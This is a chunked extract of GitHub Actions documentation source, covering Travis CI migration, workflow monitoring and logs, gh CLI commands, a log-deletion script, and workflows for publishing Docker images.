For more information about working with a particular language, see the specific guide:\n- Building and testing Node.js\n- Building and testing Python\n- Building and testing PowerShell\n- Building and testing Java with Maven\n- Building and testing Java with Gradle\n- Building and testing Java with Ant\n\n\n\nExecuting scripts\n\n{% data variables.product.prodname_actions %} can use `run` steps to run scripts or shell commands. To use a particular shell, you can specify the `shell` type when providing the path to the script. For more information, see \"AUTOTITLE.\"\n\nFor example:\n\n```yaml\nsteps:\n  - name: Run build script\n    run: ./.github/scripts/build.sh\n    shell: bash\n```\n\n\n\nError handling in {% data variables.product.prodname_actions %}\n\nWhen migrating to {% data variables.product.prodname_actions %}, there are different approaches to error handling that you might need to be aware of.\n\n\n\nScript error handling\n\n{% data variables.product.prodname_actions %} stops a job immediately if one of the steps returns an error code. For more information, see \"AUTOTITLE.\"\n\n\n\nJob error handling\n\n{% data variables.product.prodname_actions %} uses `if` conditionals to execute jobs or steps in certain situations. For example, you can run a step when another step results in a `failure()`. For more information, see \"AUTOTITLE.\"  You can also use `continue-on-error` to prevent a workflow run from stopping when a job fails.\n\n\n\nMigrating syntax for conditionals and expressions\n\nTo run jobs under conditional expressions, Travis CI and {% data variables.product.prodname_actions %} share a similar `if` condition syntax. {% data variables.product.prodname_actions %} lets you use the `if` conditional to prevent a job or step from running unless a condition is met. For more information, see \"AUTOTITLE.\"\n\nThis example demonstrates how an `if` conditional can control whether a step is executed:\n\n```yaml\njobs:\n  conditional:\n    runs-on: ubuntu-latest\n    steps", "Y2h1bmtfNF9pbmRleF8xNjg=": ":\n      - run: echo \"This step runs with str equals 'ABC' and num equals 123\"\n        if: env.str == 'ABC' && env.num == 123\n```\n\n\n\nMigrating phases to steps\n\nWhere Travis CI uses _phases_ to run _steps_, {% data variables.product.prodname_actions %} has _steps_ which execute _actions_. You can find prebuilt actions in the {% data variables.product.prodname_marketplace %}, or you can create your own actions. For more information, see \"AUTOTITLE.\"\n\nBelow is an example of the syntax for each system.\n\n\n\nTravis CI syntax for phases and steps\n\n{% raw %}\n\n```yaml\nlanguage: python\npython:\n  - \"3.7\"\n\nscript:\n  - python script.py\n```\n\n{% endraw %}\n\n\n\n{% data variables.product.prodname_actions %} syntax for steps and actions\n\n```yaml\njobs:\n  run_python:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {% data reusables.actions.action-setup-python %}\n        with:\n          python-version: '3.7'\n          architecture: 'x64'\n      - run: python script.py\n```\n\n\n\nCaching dependencies\n\nTravis CI and {% data variables.product.prodname_actions %} let you manually cache dependencies for later reuse.\n\n{% ifversion actions-caching %}\n\nThese examples demonstrate the cache syntax for each system.\n\n\n\nTravis CI syntax for caching\n\n{% raw %}\n\n```yaml\nlanguage: node_js\ncache: npm\n```\n\n{% endraw %}\n\n\n\nGitHub Actions syntax for caching\n\n```yaml\n- name: Cache node modules\n  uses: {% data reusables.actions.action-cache %}\n  with:\n    path: ~/.npm\n    key: {% raw %}v1-npm-deps-${{ hashFiles('**/package-lock.json') }}{% endraw %}\n    restore-keys: v1-npm-deps-\n```\n\n{% else %}\n\n{% data reusables.actions.caching-availability %}\n\n{% endif %}\n\n\n\nExamples of common tasks\n\nThis section compares how {% data variables.product.prodname_actions %} and Travis CI perform common tasks.\n\n\n\nConfiguring environment variables\n\nYou can create custom environment variables in a {% data variables.product.prodname_actions %} job.\n\n\n\nTravis CI syntax for an environment variable\n\n```yaml\nenv:\n  - MAVEN_PATH=\"/usr/local/maven\"\n```\n\n\n\n{% data variables.product.prodn", "Y2h1bmtfNV9pbmRleF8xNjg=": "ame_actions %} workflow with an environment variable\n\n```yaml\njobs:\n  maven-build:\n    env:\n      MAVEN_PATH: '/usr/local/maven'\n```\n\n\n\nBuilding with Node.js\n\n\n\nTravis CI for building with Node.js\n\n{% raw %}\n\n```yaml\ninstall:\n  - npm install\nscript:\n  - npm run build\n  - npm test\n```\n\n{% endraw %}\n\n\n\n{% data variables.product.prodname_actions %} workflow for building with Node.js\n\n```yaml\nname: Node.js CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Use Node.js\n        uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: '16.x'\n      - run: npm install\n      - run: npm run build\n      - run: npm test\n```\n\n\n\nNext steps\n\nTo continue learning about the main features of  {% data variables.product.prodname_actions %}, see \"AUTOTITLE.\"\n\n", "Y2h1bmtfMF9pbmRleF8xNjk=": "\n\nMonitoring your workflows\n\n{% ifversion github-runner-dashboard %}\n\n\n\nMonitoring your current jobs in your organization or enterprise\n\n{% data reusables.actions.github-hosted-runners-check-concurrency %}\n\n{% endif %}\n\n\n\nUsing the visualization graph\n\nEvery workflow run generates a real-time graph that illustrates the run progress. You can use this graph to monitor and debug workflows. For example:\n\n   !Screenshot of the visualization graph of a workflow run.\n\nFor more information, see \"AUTOTITLE.\"\n\n\n\nAdding a workflow status badge\n\n{% data reusables.repositories.actions-workflow-status-badge-intro %}\n\nFor more information, see \"AUTOTITLE.\"\n\n{% ifversion fpt or ghec %}\n\n\n\nViewing job execution time\n\nTo identify how long a job took to run, you can view its execution time. For more information, see \"AUTOTITLE.\"\n{% endif %}\n\n\n\nViewing workflow run history\n\nYou can view the status of each job and step in a workflow. For more information, see \"AUTOTITLE.\"\n\n\n\nTroubleshooting your workflows\n\n\n\nUsing workflow run logs\n\nEach workflow run generates activity logs that you can view, search, and download. For more information, see \"AUTOTITLE.\"\n\n\n\nEnabling debug logging\n\nIf the workflow logs do not provide enough detail to diagnose why a workflow, job, or step is not working as expected, you can enable additional debug logging. For more information, see \"AUTOTITLE.\"\n\n\n\nCanceling a workflow\n\nIf you attempt to cancel a workflow and the cancellation doesn't succeed, make sure you aren't using the `always` expression. The `always` expression causes a workflow step to run even when the workflow is canceled, which results in a hanging cancellation. For more information, see \"AUTOTITLE\".\n\n\n\nMonitoring and troubleshooting self-hosted runners\n\nIf you use self-hosted runners, you can view their activity and diagnose common issues.\n\nFor more information, see \"AUTOTITLE.\"\n\n", "Y2h1bmtfMF9pbmRleF8xNzA=": "\n\nUsing the workflow file name\n\nYou can build the URL for a workflow status badge using the name of the workflow file:\n\n```text\n{% ifversion fpt or ghec %}https://github.com{% else %}HOSTNAME{% endif %}/OWNER/REPOSITORY/actions/workflows/WORKFLOW-FILE/badge.svg\n```\n\nTo display the workflow status badge in your `README.md` file, use the Markdown markup for embedding images. For more information about image markup in Markdown, see \"AUTOTITLE.\"\n\nFor example, add the following Markdown to your `README.md` file to add a status badge for a workflow with the file path `.github/workflows/main.yml`. The `OWNER` of the repository is the `github` organization and the `REPOSITORY` name is `docs`.\n\n```markdown\n!example workflow\n```\n\n\n\nUsing the `branch` parameter\n\nTo display the status of a workflow run for a specific branch, add `?branch=BRANCH-NAME` to the end of the status badge URL.\n\nFor example, add the following Markdown to your `README.md` file to display a status badge for a branch with the name `feature-1`.\n\n```markdown\n!example branch parameter\n```\n\n\n\nUsing the `event` parameter\n\nTo display the status of workflow runs triggered by the `push` event, add `?event=push` to the end of the status badge URL.\n\nFor example, add the following Markdown to your `README.md` file to display a badge with the status of workflow runs triggered by the `push` event, which will show the status of the build for the current state of that branch.\n\n```markdown\n!example event parameter\n```\n\n", "Y2h1bmtfMF9pbmRleF8xNzE=": "\n\nEnabling runner diagnostic logging\n\nRunner diagnostic logging provides additional log files that contain information about how a runner is executing a job. Two extra log files are added to the log archive:\n\n- The runner process log, which includes information about coordinating and setting up runners to execute jobs.\n- The worker process log, which logs the execution of a job.\n\n1. To enable runner diagnostic logging, set the following secret{% ifversion actions-configuration-variables %} or variable{% endif %} in the repository that contains the workflow: `ACTIONS_RUNNER_DEBUG` to `true`.{% ifversion actions-configuration-variables %} If both the secret and variable are set, the value of the secret takes precedence over the variable.{% endif %}\n1. To download runner diagnostic logs, download the log archive of the workflow run. The runner diagnostic logs are contained in the `runner-diagnostic-logs` folder. For more information on downloading logs, see \"AUTOTITLE.\"\n\n\n\nEnabling step debug logging\n\nStep debug logging increases the verbosity of a job's logs during and after a job's execution.\n\n1. To enable step debug logging, set the following secret{% ifversion actions-configuration-variables %} or variable{% endif %} in the repository that contains the workflow: `ACTIONS_STEP_DEBUG` to `true`.{% ifversion actions-configuration-variables %} If both the secret and variable are set, the value of the secret takes precedence over the variable.{% endif %}\n1. After setting the secret{% ifversion actions-configuration-variables %} or variable{% endif %}, more debug events are shown in the step logs. For more information, see \"AUTOTITLE.\"\n\n", "Y2h1bmtfMF9pbmRleF8xNzI=": "---\ntitle: Notifications for workflow runs\nshortTitle: Notifications for workflow runs\nintro: You can subscribe to notifications about workflow runs that you trigger.\nversions:\n  fpt: '*'\n  ghes: '*'\n  ghae: '*'\n  ghec: '*'\n---\n \n{% data reusables.actions.enterprise-github-hosted-runners %}\n\n{% data reusables.repositories.workflow-notifications %}\n\n", "Y2h1bmtfMF9pbmRleF8xNzM=": "---\ntitle: Using the visualization graph\nshortTitle: Visualization graph\nintro: Every workflow run generates a real-time graph that illustrates the run progress. You can use this graph to monitor and debug workflows.\nredirect_from:\n  - /actions/managing-workflow-runs/using-the-visualization-graph\nversions:\n  fpt: '*'\n  ghes: '*'\n  ghae: '*'\n  ghec: '*'\n---\n \n{% data reusables.actions.enterprise-github-hosted-runners %}\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.actions-tab %}\n{% data reusables.repositories.navigate-to-workflow %}\n{% data reusables.repositories.view-run %}\n\n1. The graph displays each job in the workflow. An icon to the left of the job name indicates the status of the job. Lines between jobs indicate dependencies.\n\n   !Screenshot of the visualization graph of a workflow run.\n1. To view a job's log, click the job.\n\n", "Y2h1bmtfMF9pbmRleF8xNzQ=": "\n\nViewing logs to diagnose failures\n\nIf your workflow run fails, you can see which step caused the failure and review the failed step's build logs to troubleshoot. You can see the time it took for each step to run. You can also copy a permalink to a specific line in the log file to share with your team. {% data reusables.repositories.permissions-statement-read %}\n\nIn addition to the steps configured in the workflow file, {% data variables.product.prodname_dotcom %} adds two additional steps to each job to set up and complete the job's execution. These steps are logged in the workflow run with the names \"Set up job\" and \"Complete job\".\n\nFor jobs run on {% data variables.product.prodname_dotcom %}-hosted runners, \"Set up job\" records details of the runner image, and includes a link to the list of preinstalled tools that were present on the runner machine.\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.actions-tab %}\n{% data reusables.repositories.navigate-to-workflow %}\n{% data reusables.repositories.view-run %}\n{% data reusables.repositories.navigate-to-job %}\n{% data reusables.repositories.view-failed-job-results %}\n{% data reusables.repositories.view-specific-line %}\n\n\n\nSearching logs\n\nYou can search the build logs for a particular step. When you search logs, only expanded steps are included in the results. {% data reusables.repositories.permissions-statement-read %}\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.actions-tab %}\n{% data reusables.repositories.navigate-to-workflow %}\n{% data reusables.repositories.view-run %}\n{% data reusables.repositories.navigate-to-job %}\n1. In the upper-right corner of the log output, in the **Search logs** search box, type a search query.\n\n\n\nDownloading logs\n\nYou can download the log files from your workflow run. You can also download a workflow's artifacts. For more information, see \"AUTOTITLE.\" {% data reusables.repositories.permissions-statement-read %}\n\n{% data reusables.repositories.navigate-to-repo ", "Y2h1bmtfMV9pbmRleF8xNzQ=": "%}\n{% data reusables.repositories.actions-tab %}\n{% data reusables.repositories.navigate-to-workflow %}\n{% data reusables.repositories.view-run %}\n{% data reusables.repositories.navigate-to-job %}\n1. In the upper right corner of the log, select the {% octicon \"gear\" aria-label=\"Show options\" %} dropdown menu, then click **Download log archive**.\n\n   !Screenshot of the log for a job. In the header, a gear icon is outlined in dark orange.\n\n  {% ifversion re-run-jobs %}\n\n  {% note %}\n\n  **Note**: When you download the log archive for a workflow that was partially re-run, the archive only includes the jobs that were re-run. To get a complete set of logs for jobs that were run from a workflow, you must download the log archives for the previous run attempts that ran the other jobs.\n\n  {% endnote %}\n\n  {% endif %}\n\n\n\nDeleting logs\n\nYou can delete the log files from your workflow runs through the {% data variables.product.prodname_dotcom %} web interface or programmatically. {% data reusables.repositories.permissions-statement-write %}\n\n\n\nDeleting logs via the {% data variables.product.prodname_dotcom %} web interface\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.actions-tab %}\n{% data reusables.repositories.navigate-to-workflow %}\n{% data reusables.repositories.view-run %}\n1. In the upper-right corner, select the {% octicon \"kebab-horizontal\" aria-label=\"Show workflow options\" %} dropdown menu, then click **Delete all logs**.\n\n    !Screenshot of the page for a workflow run. In the top-right corner, a button, labeled with a kebab icon, is outlined in dark orange.\n\n1. Review the confirmation prompt.\n\nAfter deleting logs, the **Delete all logs** button is removed to indicate that no log files remain in the workflow run.\n\n\n\nDeleting logs programmatically\n\nYou can use the following script to automatically delete all logs for a workflow. This can be a useful way to clean up logs for multiple workflow runs.\n\nTo run the example script below:\n\n1. Copy the code example and save it to a file c", "Y2h1bmtfMl9pbmRleF8xNzQ=": "alled `delete-logs.sh`.\n1. Grant it the execute permission with `chmod +x delete-logs.sh`.\n1. Run the following command, where `REPOSITORY_NAME` is the name of your repository and `WORKFLOW_NAME` is the file name of your workflow.\n\n    ```shell copy\n    ./delete-logs.sh REPOSITORY_NAME WORKFLOW_NAME\n    ```\n\n    For example, to delete all of the logs in the `monalisa/octocat` repository for the `.github/workflows/ci.yaml` workflow, you would run `./delete-logs.sh monalisa/octocat ci.yaml`.\n\n\n\nExample script\n\n```bash copy\n#!/usr/bin/env bash\n\n\n\nDelete all logs for a given workflow\n\nset -oe pipefail\n\nREPOSITORY=$1\nWORKFLOW_NAME=$2\n\n\n\nValidate arguments\nif [[ -z \"$REPOSITORY\" ]]; then\n  echo \"Repository is required\"\n  exit 1\nfi\n\nif [[ -z \"$WORKFLOW_NAME\" ]]; then\n  echo \"Workflow name is required\"\n  exit 1\nfi\n\necho \"Getting all completed runs for workflow $WORKFLOW_NAME in $REPOSITORY\"\n\nRUNS=$(\n  gh api \\\n    -H \"Accept: application/vnd.github+json\" \\\n    -H \"X-GitHub-Api-Version: 2022-11-28\" \\\n    \"/repos/$REPOSITORY/actions/workflows/$WORKFLOW_NAME/runs\" \\\n    --paginate \\\n    --jq '.workflow_runs[] | select(.conclusion != \"\") | .id'\n)\n\necho \"Found $(echo \"$RUNS\" | wc -l) completed runs for workflow $WORKFLOW_NAME\"\n\n\n\nDelete logs for each run\nfor RUN in $RUNS; do\n  echo \"Deleting logs for run $RUN\"\n  gh api \\\n    --silent \\\n    --method DELETE \\\n    -H \"Accept: application/vnd.github+json\" \\\n    -H \"X-GitHub-Api-Version: 2022-11-28\" \\\n    \"/repos/$REPOSITORY/actions/runs/$RUN/logs\" || echo \"Failed to delete logs for run $RUN\"\n\n  # Sleep for 100ms to avoid rate limiting\n  sleep 0.1\ndone\n```\n\n\n\nViewing logs with {% data variables.product.prodname_cli %}\n\n{% data reusables.cli.cli-learn-more %}\n\nTo view the log for a specific job, use the `run view` subcommand. Replace `run-id` with the ID of run that you want to view logs for. {% data variables.product.prodname_cli %} returns an interactive menu for you to choose a job from the run. If you don't specify `run-id`, {% data variables.product.prodname_cli %} returns an ", "Y2h1bmtfM19pbmRleF8xNzQ=": "interactive menu for you to choose a recent run, and then returns another interactive menu for you to choose a job from the run.\n\n```shell\ngh run view RUN_ID --log\n```\n\nYou can also use the `--job` flag to specify a job ID. Replace `job-id` with the ID of the job that you want to view logs for.\n\n```shell\ngh run view --job JOB_ID --log\n```\n\nYou can use `grep` to search the log. For example, this command will return all log entries that contain the word `error`.\n\n```shell\ngh run view --job JOB_ID --log | grep error\n```\n\nTo filter the logs for any failed steps, use `--log-failed` instead of `--log`.\n\n```shell\ngh run view --job JOB_ID --log-failed\n```\n\n", "Y2h1bmtfMF9pbmRleF8xNzU=": "---\ntitle: Viewing job execution time\nshortTitle: View job execution time\nintro: 'You can view the execution time of a job, including the billable minutes that a job accrued.'\nredirect_from:\n  - /actions/managing-workflow-runs/viewing-job-execution-time\nversions:\n  fpt: '*'\n  ghec: '*'\n---\n \n{% data reusables.actions.enterprise-github-hosted-runners %}\n\nBillable job execution minutes are only shown for jobs run on private repositories that use {% data variables.product.prodname_dotcom %}-hosted runners and are rounded up to the next minute. There are no billable minutes when using {% data variables.product.prodname_actions %} in public repositories or for jobs run on self-hosted runners.\n\n{% data reusables.repositories.navigate-to-repo %}\n{% data reusables.repositories.actions-tab %}\n{% data reusables.repositories.navigate-to-workflow %}\n{% data reusables.repositories.view-run %}\n1. Under the job summary, you can view the job's execution time.\n1. To view details about the billable job execution time, in the left sidebar under \"Run details\", click **{% octicon \"stopwatch\" aria-hidden=\"true\" %} Usage**.\n\n   {% note %}\n\n   **Note:** The billable time shown does not include any minute multipliers. To view your total {% data variables.product.prodname_actions %} usage, including minute multipliers, see \"AUTOTITLE.\"\n\n   {% endnote %}\n\n", "Y2h1bmtfMF9pbmRleF8xNzY=": "\n\nViewing recent workflow runs\n\nTo list the recent workflow runs, use the `run list` subcommand.\n\n```shell\ngh run list\n```\n\nTo specify the maximum number of runs to return, you can use the `-L` or `--limit` flag . The default is `10`.\n\n```shell\ngh run list --limit 5\n```\n\nTo only return runs for the specified workflow, you can use the `-w` or `--workflow` flag.  Replace `workflow` with either the workflow name, workflow ID, or workflow file name. For example, `\"Link Checker\"`, `1234567`, or `\"link-check-test.yml\"`.\n\n```shell\ngh run list --workflow WORKFLOW\n```\n\n\n\nViewing details for a specific workflow run\n\nTo display details for a specific workflow run, use the `run view` subcommand. Replace `run-id` with the ID of the run that you want to view. If you don't specify a `run-id`, {% data variables.product.prodname_cli %} returns an interactive menu for you to choose a recent run.\n\n```shell\ngh run view RUN_ID\n```\n\nTo include job steps in the output, use the `-v` or `--verbose` flag.\n\n```shell\ngh run view RUN_ID --verbose\n```\n\nTo view details for a specific job in the run, use the `-j` or `--job` flag.  Replace `job-id` with the ID of the job that you want to view.\n\n```shell\ngh run view --job JOB_ID\n```\n\nTo view the full log for a job, use the `--log` flag.\n\n```shell\ngh run view --job JOB_ID --log\n```\n\nUse the `--exit-status` flag to exit with a non-zero status if the run failed. For example:\n\n```shell\ngh run view 0451 --exit-status && echo \"run pending or passed\"\n```\n\n{% endcli %}\n\n", "Y2h1bmtfMF9pbmRleF8xNzc=": "\n\nFurther reading\n\n- \"AUTOTITLE\"\n\n", "Y2h1bmtfMF9pbmRleF8xNzg=": "\n\nIntroduction\n\nThis guide shows you how to create a workflow that performs a Docker build, and then publishes Docker images to Docker Hub or {% data variables.product.prodname_registry %}. With a single workflow, you can publish images to a single registry or to multiple registries.\n\n{% note %}\n\n**Note:** If you want to push to another third-party Docker registry, the example in the \"Publishing images to {% data variables.product.prodname_registry %}\" section can serve as a good template.\n\n{% endnote %}\n\n\n\nPrerequisites\n\nWe recommend that you have a basic understanding of workflow configuration options and how to create a workflow file. For more information, see \"AUTOTITLE.\"\n\nYou might also find it helpful to have a basic understanding of the following:\n\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"{% ifversion fpt or ghec %}\n- \"AUTOTITLE\"{% else %}\n- \"AUTOTITLE\"{% endif %}\n\n\n\nAbout image configuration\n\nThis guide assumes that you have a complete definition for a Docker image stored in a {% data variables.product.prodname_dotcom %} repository. For example, your repository must contain a _Dockerfile_, and any other files needed to perform a Docker build to create an image.\n\n{% ifversion fpt or ghec or ghes %}\n\n{% data reusables.package_registry.about-annotation-keys %} For more information, see \"AUTOTITLE.\"\n\n{% endif %}\n\nIn this guide, we will use the Docker `build-push-action` action to build the Docker image and push it to one or more Docker registries. For more information, see `build-push-action`.\n\n{% data reusables.actions.enterprise-marketplace-actions %}\n\n\n\nPublishing images to Docker Hub\n\n{% data reusables.actions.release-trigger-workflow %}\n\nIn the example workflow below, we use the Docker `login-action` and `build-push-action` actions to build the Docker image and, if the build succeeds, push the built image to Docker Hub.\n\nTo push to Docker Hub, you will need to have a Docker Hub account, and have a Docker Hub repository created. For more information, see \"Pushing a Docker container image to Docker Hub\" in the Docker do", "Y2h1bmtfMV9pbmRleF8xNzg=": "cumentation.\n\nThe `login-action` options required for Docker Hub are:\n- `username` and `password`: This is your Docker Hub username and password. We recommend storing your Docker Hub username and password as secrets so they aren't exposed in your workflow file. For more information, see \"AUTOTITLE.\"\n\nThe `metadata-action` option required for Docker Hub is:\n- `images`: The namespace and name for the Docker image you are building/pushing to Docker Hub.\n\nThe `build-push-action` options required for Docker Hub are:\n- `tags`: The tag of your new image in the format `DOCKER-HUB-NAMESPACE/DOCKER-HUB-REPOSITORY:VERSION`. You can set a single tag as shown below, or specify multiple tags in a list.\n- `push`: If set to `true`, the image will be pushed to the registry if it is built successfully.\n\n```yaml copy\n{% data reusables.actions.actions-not-certified-by-github-comment %}\n\n{% data reusables.actions.actions-use-sha-pinning-comment %}\n\nname: Publish Docker image\n\non:\n  release:\n    types: [published]\n\njobs:\n  push_to_registry:\n    name: Push Docker image to Docker Hub\n    runs-on: {% ifversion ghes %}[self-hosted]{% else %}ubuntu-latest{% endif %}\n    steps:\n      - name: Check out the repo\n        uses: {% data reusables.actions.action-checkout %}\n      \n      - name: Log in to Docker Hub\n        uses: docker/login-action@f4ef78c080cd8ba55a85445d5b36e214a81df20a\n        with:\n          username: {% raw %}${{ secrets.DOCKER_USERNAME }}{% endraw %}\n          password: {% raw %}${{ secrets.DOCKER_PASSWORD }}{% endraw %}\n      \n      - name: Extract metadata (tags, labels) for Docker\n        id: meta\n        uses: docker/metadata-action@9ec57ed1fcdbf14dcef7dfbe97b2010124a938b7\n        with:\n          images: my-docker-hub-namespace/my-docker-hub-repository\n      \n      - name: Build and push Docker image\n        uses: docker/build-push-action@3b5e8027fcad23fda98b2e3ac259d8d67585f671\n        with:\n          context: .\n          file: ./Dockerfile\n          push: true\n          tags: {% raw %}${{ steps.meta.outputs.tags }}{% ", "Y2h1bmtfMl9pbmRleF8xNzg=": "endraw %}\n          labels: {% raw %}${{ steps.meta.outputs.labels }}{% endraw %}\n```\n\nThe above workflow checks out the {% data variables.product.prodname_dotcom %} repository, uses the `login-action` to log in to the registry, and then uses the `build-push-action` action to: build a Docker image based on your repository's `Dockerfile`; push the image to Docker Hub, and apply a tag to the image.\n\n\n\nPublishing images to {% data variables.product.prodname_registry %}\n\n{% ifversion ghes %}\n{% data reusables.package_registry.container-registry-ghes-beta %}\n{% endif %}\n\n{% data reusables.actions.release-trigger-workflow %}\n\nIn the example workflow below, we use the Docker `login-action`{% ifversion fpt or ghec %}, `metadata-action`,{% endif %} and `build-push-action` actions to build the Docker image, and if the build succeeds, push the built image to {% data variables.product.prodname_registry %}.\n\nThe `login-action` options required for {% data variables.product.prodname_registry %} are:\n- `registry`: Must be set to {% ifversion fpt or ghec %}`ghcr.io`{% elsif ghes %}`{% data reusables.package_registry.container-registry-hostname %}`{% else %}`docker.pkg.github.com`{% endif %}.\n- `username`: You can use the {% raw %}`${{ github.actor }}`{% endraw %} context to automatically use the username of the user that triggered the workflow run. For more information, see \"AUTOTITLE.\"\n- `password`: You can use the automatically-generated `GITHUB_TOKEN` secret for the password. For more information, see \"AUTOTITLE.\"\n\n{% ifversion fpt or ghec %}\nThe `metadata-action` option required for {% data variables.product.prodname_registry %} is:\n- `images`: The namespace and name for the Docker image you are building.\n{% endif %}\n\nThe `build-push-action` options required for {% data variables.product.prodname_registry %} are:{% ifversion fpt or ghec %}\n\n- `context`: Defines the build's context as the set of files located in the specified path.{% endif %}\n- `push`: If set to `true`, the image will be pushed to the registry if it is built ", "Y2h1bmtfM19pbmRleF8xNzg=": "successfully.{% ifversion fpt or ghec %}\n- `tags` and `labels`: These are populated by output from `metadata-action`.{% else %}\n- `tags`: Must be set in the format {% ifversion ghes %}`{% data reusables.package_registry.container-registry-hostname %}/OWNER/REPOSITORY/IMAGE_NAME:VERSION`.\n  \n   For example, for an image named `octo-image` stored on {% data variables.product.prodname_ghe_server %} at `https://HOSTNAME/octo-org/octo-repo`, the `tags` option should be set to `{% data reusables.package_registry.container-registry-hostname %}/octo-org/octo-repo/octo-image:latest`{% else %}`docker.pkg.github.com/OWNER/REPOSITORY/IMAGE_NAME:VERSION`.\n  \n   For example, for an image named `octo-image` stored on {% data variables.product.prodname_dotcom %} at `http://github.com/octo-org/octo-repo`, the `tags` option should be set to `docker.pkg.github.com/octo-org/octo-repo/octo-image:latest`{% endif %}. You can set a single tag as shown below, or specify multiple tags in a list.{% endif %}\n\n{% ifversion fpt or ghec or ghes %}\n{% data reusables.package_registry.publish-docker-image %}\n\nThe above workflow is triggered by a push to the \"release\" branch. It checks out the GitHub repository, and uses the `login-action` to log in to the {% data variables.product.prodname_container_registry %}. It then extracts labels and tags for the Docker image. Finally, it uses the `build-push-action` action to build the image and publish it on the {% data variables.product.prodname_container_registry %}.\n\n{% else %}\n\n```yaml copy\n{% data reusables.actions.actions-not-certified-by-github-comment %}\n\n{% data reusables.actions.actions-use-sha-pinning-comment %}\n\nname: Publish Docker image\n\non:\n  release:\n    types: [published]\njobs:\n  push_to_registry:\n    name: Push Docker image to GitHub Packages\n    runs-on: ubuntu-latest\n    permissions:\n      packages: write\n      contents: read\n    steps:\n      - name: Check out the repo\n        uses: {% data reusables.actions.action-checkout %}\n      \n      - name: Log in to GitHub Docker Registry\n     ", "Y2h1bmtfNF9pbmRleF8xNzg=": "   uses: docker/login-action@f4ef78c080cd8ba55a85445d5b36e214a81df20a\n        with:\n          registry: {% ifversion ghae %}docker.YOUR-HOSTNAME.com{% else %}docker.pkg.github.com{% endif %}\n          username: {% raw %}${{ github.actor }}{% endraw %}\n          password: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n      \n      - name: Build and push Docker image\n        uses: docker/build-push-action@3b5e8027fcad23fda98b2e3ac259d8d67585f671\n        with:\n          context: .\n          push: true\n          tags: |\n            {% ifversion ghae %}docker.YOUR-HOSTNAME.com{% else %}docker.pkg.github.com{% endif %}{% raw %}/${{ github.repository }}/octo-image:${{ github.sha }}{% endraw %}\n            {% ifversion ghae %}docker.YOUR-HOSTNAME.com{% else %}docker.pkg.github.com{% endif %}{% raw %}/${{ github.repository }}/octo-image:${{ github.event.release.tag_name }}{% endraw %}\n```\n\nThe above workflow checks out the {% data variables.product.product_name %} repository, uses the `login-action` to log in to the registry, and then uses the `build-push-action` action to: build a Docker image based on your repository's `Dockerfile`; push the image to the Docker registry, and apply the commit SHA and release version as image tags.\n{% endif %}\n\n\n\nPublishing images to Docker Hub and {% data variables.product.prodname_registry %}\n\n{% ifversion ghes %}\n{% data reusables.package_registry.container-registry-ghes-beta %}\n{% endif %}\n\nIn a single workflow, you can publish your Docker image to multiple registries by using the `login-action` and `build-push-action` actions for each registry.\n\nThe following example workflow uses the steps from the previous sections (\"Publishing images to Docker Hub\" and \"Publishing images to {% data variables.product.prodname_registry %}\") to create a single workflow that pushes to both registries.\n\n```yaml copy\n{% data reusables.actions.actions-not-certified-by-github-comment %}\n\n{% data reusables.actions.actions-use-sha-pinning-comment %}\n\nname: Publish Docker image\n\non:\n  release:\n    types: [", "Y2h1bmtfNV9pbmRleF8xNzg=": "published]\n\njobs:\n  push_to_registries:\n    name: Push Docker image to multiple registries\n    runs-on: {% ifversion ghes %}[self-hosted]{% else %}ubuntu-latest{% endif %}\n    permissions:\n      packages: write\n      contents: read\n    steps:\n      - name: Check out the repo\n        uses: {% data reusables.actions.action-checkout %}\n      \n      - name: Log in to Docker Hub\n        uses: docker/login-action@f4ef78c080cd8ba55a85445d5b36e214a81df20a\n        with:\n          username: {% raw %}${{ secrets.DOCKER_USERNAME }}{% endraw %}\n          password: {% raw %}${{ secrets.DOCKER_PASSWORD }}{% endraw %}\n      \n      - name: Log in to the {% ifversion fpt or ghec or ghes %}Container{% else %}Docker{% endif %} registry\n        uses: docker/login-action@65b78e6e13532edd9afa3aa52ac7964289d1a9c1\n        with:\n          registry: {% ifversion fpt or ghec %}ghcr.io{% elsif ghae %}docker.YOUR-HOSTNAME.com{% elsif ghes %}{% data reusables.package_registry.container-registry-hostname %}{% else %}docker.pkg.github.com{% endif %}\n          username: {% raw %}${{ github.actor }}{% endraw %}\n          password: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n      \n      - name: Extract metadata (tags, labels) for Docker\n        id: meta\n        uses: docker/metadata-action@9ec57ed1fcdbf14dcef7dfbe97b2010124a938b7\n        with:\n          images: |\n            my-docker-hub-namespace/my-docker-hub-repository\n            {% ifversion fpt or ghec or ghes %}{% data reusables.package_registry.container-registry-hostname %}/{% raw %}${{ github.repository }}{% endraw %}{% elsif ghae %}{% raw %}docker.YOUR-HOSTNAME.com/${{ github.repository }}/my-image{% endraw %}{% else %}{% raw %}docker.pkg.github.com/${{ github.repository }}/my-image{% endraw %}{% endif %}\n      \n      - name: Build and push Docker images\n        uses: docker/build-push-action@3b5e8027fcad23fda98b2e3ac259d8d67585f671\n        with:\n          context: .\n          push: true\n          tags: {% raw %}${{ steps.meta.outputs.tags }}{% endraw %}\n          labels: {% raw %", "Y2h1bmtfNl9pbmRleF8xNzg=": "}${{ steps.meta.outputs.labels }}{% endraw %}\n```\n\nThe above workflow checks out the {% data variables.product.product_name %} repository, uses the `login-action` twice to log in to both registries and generates tags and labels with the `metadata-action` action.\nThen the `build-push-action` action builds and pushes the Docker image to Docker Hub and the {% ifversion fpt or ghec or ghes %}{% data variables.product.prodname_container_registry %}{% else %}Docker registry{% endif %}.\n\n", "Y2h1bmtfMF9pbmRleF8xNzk=": "\n\nIntroduction\n\n{% data reusables.actions.publishing-java-packages-intro %}\n\n\n\nPrerequisites\n\nWe recommend that you have a basic understanding of workflow files and configuration options. For more information, see \"AUTOTITLE.\"\n\nFor more information about creating a CI workflow for your Java project with Gradle, see \"AUTOTITLE.\"\n\nYou may also find it helpful to have a basic understanding of the following:\n\n- 